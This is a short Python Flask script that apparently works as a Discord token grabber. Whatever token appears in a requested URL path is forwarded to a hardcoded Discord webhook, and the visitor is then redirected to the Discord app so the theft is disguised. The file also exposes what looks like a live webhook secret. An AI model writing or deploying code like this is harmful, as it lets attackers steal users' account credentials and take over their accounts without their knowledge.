from dhooks import Webhook
from flask import Flask, redirect
e = "https://discord.com/api/webhooks/1343315527161876510/C-lXrEFbRk0_wFVbzIKnUtza8SRIflZ54XVq9IzNPUXy43otxnwWh3I-bs9RnX08UeLZ"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
